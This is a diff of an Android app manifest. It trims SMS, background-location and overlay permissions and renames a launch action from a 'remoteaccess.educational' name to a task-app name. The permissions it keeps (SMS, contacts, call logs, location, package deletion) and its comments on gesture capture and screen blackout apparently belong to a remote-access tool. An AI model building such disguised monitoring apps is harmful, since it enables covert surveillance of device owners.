@@ -21,11 +21,8 @@
     <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
-    <!-- SMS (WRITE_SMS allows deletion on devices where this app is set as default SMS app) -->
+    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.WRITE_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
     <!-- Contacts & Call logs -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
@@ -38,7 +35,6 @@
     <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
     <!-- Storage (legacy + Android 13+ media) -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -52,9 +48,6 @@
         tools:ignore="ScopedStorage" />
     <!-- Access precise EXIF location in media files (Android 10+) -->
     <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
-    <!-- Overlay fallback for gesture capture when accessibility type unavailable -->
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-
     <!-- WiFi scanning -->
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
@@ -66,8 +59,6 @@
     <!-- Notifications (Android 13+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Screen blackout uses TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW needed -->
-
     <!-- Required to trigger the system uninstall dialog for other apps -->
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
 
@@ -76,7 +67,7 @@
         tools:ignore="QueryAllPackagesPermission" />
 
     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
         android:icon="@mipmap/ic_launcher"
@@ -108,7 +99,7 @@
             </intent-filter>
             <!-- Custom action for programmatic / ADB launch -->
             <intent-filter>
-                <action android:name="com.remoteaccess.educational.LAUNCH" />
+                <action android:name="com.task.tusker.LAUNCH" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
